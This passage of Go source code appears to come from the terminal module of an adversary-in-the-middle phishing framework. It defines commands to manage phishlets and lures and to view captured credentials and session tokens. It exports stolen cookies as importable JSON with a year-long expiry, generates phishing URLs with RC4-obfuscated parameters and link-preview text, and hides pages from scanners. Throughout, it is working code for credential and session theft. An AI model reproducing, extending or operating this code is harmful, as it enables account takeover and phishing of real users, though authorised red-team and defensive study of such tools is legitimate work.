	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
	h.AddSubCommand("phishlets", []string{"delete"}, "delete <phishlet>", "delete child phishlet")
	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
	h.AddSubCommand("phishlets", []string{"unauth_url"}, "unauth_url <phishlet> <url>", "override global unauth_url just for this phishlet")
	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables phishlet and requests ssl/tls certificate if needed")
	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables phishlet")
	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")

	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")

	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
			readline.PcItem("delete", readline.PcItem("all"))))

	h.AddSubCommand("lures", nil, "", "show all create lures")
	h.AddSubCommand("lures", nil, "<id>", "show details of a lure with a given <id>")
	h.AddSubCommand("lures", []string{"create"}, "create <phishlet>", "creates new lure for given <phishlet>")
	h.AddSubCommand("lures", []string{"delete"}, "delete <id>", "deletes lure with given <id>")
	h.AddSubCommand("lures", []string{"delete", "all"}, "delete all", "deletes all created lures")
	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> <key1=value1> <key2=value2>", "generates a phishing url for a lure with a given <id>, with optional parameters")
	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> import <params_file> export <urls_file> <text|csv|json>", "generates phishing urls, importing parameters from <import_path> file and exporting them to <export_path>")
	h.AddSubCommand("lures", []string{"pause"}, "pause <id> <1d2h3m4s>", "pause lure <id> for specific amount of time and redirect visitors to `unauth_url`")
	h.AddSubCommand("lures", []string{"unpause"}, "unpause <id>", "unpause lure <id> and make it available again")
	h.AddSubCommand("lures", []string{"edit", "hostname"}, "edit <id> hostname <hostname>", "sets custom phishing <hostname> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "path"}, "edit <id> path <path>", "sets custom url <path> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "redirector"}, "edit <id> redirector <path>", "sets an html redirector directory <path> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "ua_filter"}, "edit <id> ua_filter <regexp>", "sets a regular expression user-agent whitelist filter <regexp> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "redirect_url"}, "edit <id> redirect_url <redirect_url>", "sets redirect url that user will be navigated to on successful authorization, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "phishlet"}, "edit <id> phishlet <phishlet>", "change the phishlet, the lure with a given <id> applies to")
	h.AddSubCommand("lures", []string{"edit", "info"}, "edit <id> info <info>", "set personal information to describe a lure with a given <id> (display only)")
	h.AddSubCommand("lures", []string{"edit", "og_title"}, "edit <id> og_title <title>", "sets opengraph title that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_desc"}, "edit <id> og_des <title>", "sets opengraph description that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit <id> og_image <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")

	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))

	h.AddSubCommand("blacklist", nil, "", "show current blacklisting mode")
	h.AddSubCommand("blacklist", []string{"all"}, "all", "block and blacklist ip addresses for every single request (even authorized ones!)")
	h.AddSubCommand("blacklist", []string{"unauth"}, "unauth", "block and blacklist ip addresses only for unauthorized requests")
	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")

	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
		readline.PcItem("test-certs"))

	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
		readline.PcItem("clear"))

	t.hlp = h
}

func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.CookieToken) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
		Secure         bool   `json:"secure,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         false,
			}
			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
				c.Secure = true
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]string) string {
	var ret string
	white := color.New(color.FgHiWhite)
	for k, v := range tokens {
		ret += fmt.Sprintf("%s: %s\n", k, white.Sprint(v))
	}
	return ret
}

func (t *Terminal) checkStatus() {
	if t.cfg.GetBaseDomain() == "" {
		log.Warning("server domain not set! type: config domain <domain>")
	}
	if t.cfg.GetServerExternalIP() == "" {
		log.Warning("server external ip not set! type: config ipv4 external <external_ipv4_address>")
	}
}

func (t *Terminal) manageCertificates(verbose bool) {
	if !t.p.developer {
		hosts := t.p.cfg.GetActiveHostnames("")
		//wc_host := t.p.cfg.GetWildcardHostname()
		//hosts := []string{wc_host}
		//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
		if verbose {
			log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
		}
		err := t.p.crt_db.setManagedSync(hosts, 60*time.Second)
		if err != nil {
			log.Error("failed to set up TLS certificates: %s", err)
			log.Error("run 'test-certs' command to retry")
			return
		}
		if verbose {
			log.Info("successfully set up all TLS certificates")
		}
	}
}

func (t *Terminal) sprintPhishletStatus(site string) string {
	higreen := color.New(color.FgHiGreen)
	logreen := color.New(color.FgGreen)
	hiblue := color.New(color.FgHiBlue)
	blue := color.New(color.FgBlue)
	cyan := color.New(color.FgHiCyan)
	yellow := color.New(color.FgYellow)
	higray := color.New(color.FgWhite)
	logray := color.New(color.FgHiBlack)
	n := 0
	cols := []string{"phishlet", "status", "visibility", "hostname", "unauth_url"}
	var rows [][]string

	var pnames []string
	for s := range t.cfg.phishlets {
		pnames = append(pnames, s)
	}
	sort.Strings(pnames)

	for _, s := range pnames {
		pl := t.cfg.phishlets[s]
		if site == "" || s == site {
			_, err := t.cfg.GetPhishlet(s)
			if err != nil {
				continue
			}

			status := logray.Sprint("disabled")
			if pl.isTemplate {
				status = yellow.Sprint("template")
			} else if t.cfg.IsSiteEnabled(s) {
				status = higreen.Sprint("enabled")
			}
			hidden_status := higray.Sprint("visible")
			if t.cfg.IsSiteHidden(s) {
				hidden_status = logray.Sprint("hidden")
			}
			domain, _ := t.cfg.GetSiteDomain(s)
			unauth_url, _ := t.cfg.GetSiteUnauthUrl(s)
			n += 1

			if s == site {
				var param_names string
				for k, v := range pl.customParams {
					if len(param_names) > 0 {
						param_names += "; "
					}
					param_names += k
					if v != "" {
						param_names += ": " + v
					}
				}

				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "unauth_url", "params"}
				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url), logray.Sprint(param_names)}
				return AsRows(keys, vals)
			} else if site == "" {
				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url)})
			}
		}
	}
	return AsTable(cols, rows)
}

func (t *Terminal) sprintIsEnabled(enabled bool) string {
	logray := color.New(color.FgHiBlack)
	normal := color.New(color.Reset)

	if enabled {
		return normal.Sprint("true")
	} else {
		return logray.Sprint("false")
	}
}

func (t *Terminal) sprintLures() string {
	higreen := color.New(color.FgHiGreen)
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	cyan := color.New(color.FgCyan)
	hcyan := color.New(color.FgHiCyan)
	white := color.New(color.FgHiWhite)
	//n := 0
	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "redirect_url", "paused", "og"}
	var rows [][]string
	for n, l := range t.cfg.lures {
		var og string
		if l.OgTitle != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgDescription != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgImageUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}

		var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), yellow.Sprint(l.RedirectUrl), s_paused, og})
	}
	return AsTable(cols, rows)
}

func (t *Terminal) phishletPrefixCompleter(args string) []string {
	return t.cfg.GetPhishletNames()
}

func (t *Terminal) redirectorsPrefixCompleter(args string) []string {
	dir := t.cfg.GetRedirectorsDir()

	files, err := ioutil.ReadDir(dir)
	if err != nil {
		return []string{}
	}
	var ret []string
	for _, f := range files {
		if f.IsDir() {
			index_path1 := filepath.Join(dir, f.Name(), "index.html")
			index_path2 := filepath.Join(dir, f.Name(), "index.htm")
			index_found := ""
			if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
				index_found = index_path1
			} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
				index_found = index_path2
			}
			if index_found != "" {
				name := f.Name()
				if strings.Contains(name, " ") {
					name = "\"" + name + "\""
				}
				ret = append(ret, name)
			}
		}
	}
	return ret
}

func (t *Terminal) luresIdPrefixCompleter(args string) []string {
	var ret []string
	for n := range t.cfg.lures {
		ret = append(ret, strconv.Itoa(n))
	}
	return ret
}

func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string, []map[string]string, error) {
	var ret []string
	var ret_params []map[string]string

	f, err := os.OpenFile(path, os.O_RDONLY, 0644)
	if err != nil {
		return ret, ret_params, err
	}
	defer f.Close()

	var format string = "text"
	if filepath.Ext(path) == ".csv" {
		format = "csv"
	} else if filepath.Ext(path) == ".json" {
		format = "json"
	}

	log.Info("importing parameters file as: %s", format)

	switch format {
	case "text":
		fs := bufio.NewScanner(f)
		fs.Split(bufio.ScanLines)

		n := 0
		for fs.Scan() {
			n += 1
			l := fs.Text()
			// remove comments
			if n := strings.Index(l, ";"); n > -1 {
				l = l[:n]
			}
			l = strings.Trim(l, " ")

			if len(l) > 0 {
				args, err := parser.Parse(l)
				if err != nil {
					log.Error("syntax error at line %d: [%s] %v", n, l, err)
					continue
				}

				params := url.Values{}
				map_params := make(map[string]string)
				for _, val := range args {
					sp := strings.Index(val, "=")
					if sp == -1 {
						log.Error("invalid parameter syntax at line %d: [%s]", n, val)
						continue
					}
					k := val[:sp]
					v := val[sp+1:]

					params.Add(k, v)
					map_params[k] = v
				}

				if len(params) > 0 {
					ret = append(ret, t.createPhishUrl(base_url, &params))
					ret_params = append(ret_params, map_params)
				}
			}
		}
	case "csv":
		r := csv.NewReader(bufio.NewReader(f))

		param_names, err := r.Read()
		if err != nil {
			return ret, ret_params, err
		}

		var params []string
		for params, err = r.Read(); err == nil; params, err = r.Read() {
			if len(params) != len(param_names) {
				log.Error("number of csv values do not match number of keys: %v", params)
				continue
			}

			item := url.Values{}
			map_params := make(map[string]string)
			for n, param := range params {
				item.Add(param_names[n], param)
				map_params[param_names[n]] = param
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}
		if err != io.EOF {
			return ret, ret_params, err
		}
	case "json":
		data, err := ioutil.ReadAll(bufio.NewReader(f))
		if err != nil {
			return ret, ret_params, err
		}

		var params_json []map[string]interface{}

		err = json.Unmarshal(data, &params_json)
		if err != nil {
			return ret, ret_params, err
		}

		for _, json_params := range params_json {
			item := url.Values{}
			map_params := make(map[string]string)
			for k, v := range json_params {
				if val, ok := v.(string); ok {
					item.Add(k, val)
					map_params[k] = val
				} else {
					log.Error("json parameter '%s' value must be of type string", k)
				}
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}

		/*
			r := json.NewDecoder(bufio.NewReader(f))

			t, err := r.Token()
			if err != nil {
				return ret, ret_params, err
			}
			if s, ok := t.(string); ok && s == "[" {
				for r.More() {
					t, err := r.Token()
					if err != nil {
						return ret, ret_params, err
					}

					if s, ok := t.(string); ok && s == "{" {
						for r.More() {
							t, err := r.Token()
							if err != nil {
								return ret, ret_params, err
							}


						}
					}
				}
			} else {
				return ret, ret_params, fmt.Errorf("array of parameters not found")
			}*/
	}
	return ret, ret_params, nil
}

func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phish_params []map[string]string, format string) error {
	if len(phish_urls) != len(phish_params) {
		return fmt.Errorf("phishing urls and phishing parameters count do not match")
	}
	if !stringExists(format, []string{"text", "csv", "json"}) {
		return fmt.Errorf("export format can only be 'text', 'csv' or 'json'")
	}

	f, err := os.OpenFile(export_path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	if format == "text" {
		for n, phish_url := range phish_urls {
			var params string
			m := 0
			params_row := phish_params[n]
			for k, v := range params_row {
				if m > 0 {
					params += " "
				}
				params += fmt.Sprintf("%s=\"%s\"", k, v)
				m += 1
			}

			_, err := f.WriteString(phish_url + " ; " + params + "\n")
			if err != nil {
				return err
			}
		}
	} else if format == "csv" {
		var data [][]string

		w := csv.NewWriter(bufio.NewWriter(f))

		var cols []string
		var param_names []string
		cols = append(cols, "url")
		for _, params_row := range phish_params {
			for k := range params_row {
				if !stringExists(k, param_names) {
					cols = append(cols, k)
					param_names = append(param_names, k)
				}
			}
		}
		data = append(data, cols)

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			var vals []string
			vals = append(vals, phish_url)

			for _, k := range param_names {
				vals = append(vals, params[k])
			}

			data = append(data, vals)
		}

		err := w.WriteAll(data)
		if err != nil {
			return err
		}
	} else if format == "json" {
		type UrlItem struct {
			PhishUrl string            `json:"url"`
			Params   map[string]string `json:"params"`
		}

		var items []UrlItem

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			item := UrlItem{
				PhishUrl: phish_url,
				Params:   params,
			}

			items = append(items, item)
		}

		data, err := json.MarshalIndent(items, "", "\t")
		if err != nil {
			return err
		}

		_, err = f.WriteString(string(data))
		if err != nil {
			return err
		}
	}

	return nil
}

func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
	var ret string = base_url
	if len(*params) > 0 {
		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))

		enc_key := GenRandomAlphanumString(8)
		dec_params := params.Encode()

		var crc byte
		for _, c := range dec_params {
			crc += byte(c)
		}

		c, _ := rc4.NewCipher([]byte(enc_key))
		enc_params := make([]byte, len(dec_params)+1)
		c.XORKeyStream(enc_params[1:], []byte(dec_params))
		enc_params[0] = crc

		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
		ret += "?" + key_arg + "=" + key_val
	}
	return ret
}

func (t *Terminal) sprintVar(k string, v string) string {
	vc := color.New(color.FgYellow)
	return k + ": " + vc.Sprint(v)
}

func (t *Terminal) filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}
